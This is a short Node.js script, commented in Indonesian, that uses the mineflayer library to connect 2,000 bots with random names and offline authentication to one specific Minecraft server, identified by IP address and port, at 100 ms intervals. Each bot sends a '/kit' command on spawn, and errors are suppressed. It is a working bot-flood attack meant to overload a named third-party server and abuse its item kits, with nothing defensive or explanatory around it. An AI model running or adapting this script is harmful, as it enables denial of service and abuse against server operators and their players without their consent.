const mineflayer = require('mineflayer');

const SERVER = {
    host: '191.96.231.19',
    port: 10109,
    version: '1.21.11',
    auth: 'offline'
};

const TOTAL = 2000;           // Jumlah bot
const DELAY_MS = 100;        // Delay antar bot (milidetik) - 100 = 0.1 detik

let online = 0;

console.log(`\n🚀 Starting ${TOTAL} bots with ${DELAY_MS}ms delay...\n`);

for (let i = 1; i <= TOTAL; i++) {
    setTimeout(() => {
        const bot = mineflayer.createBot({
            host: SERVER.host,
            port: SERVER.port,
            username: `B${Math.random().toString(36).substring(2, 8)}`,
            version: SERVER.version,
            auth: SERVER.auth
        });

        bot.on('login', () => {
            online++;
            process.stdout.write(`\r✅ Connected: ${online}/${TOTAL}`);
        });

        bot.on('spawn', () => bot.chat('/kit elestiaxd'));
        bot.on('kicked', () => online--);
        bot.on('end', () => online--);
        bot.on('error', () => {});
    }, i * DELAY_MS);
}

setInterval(() => {
    console.log(`\n📊 Online: ${online}/${TOTAL}`);
}, 10000);
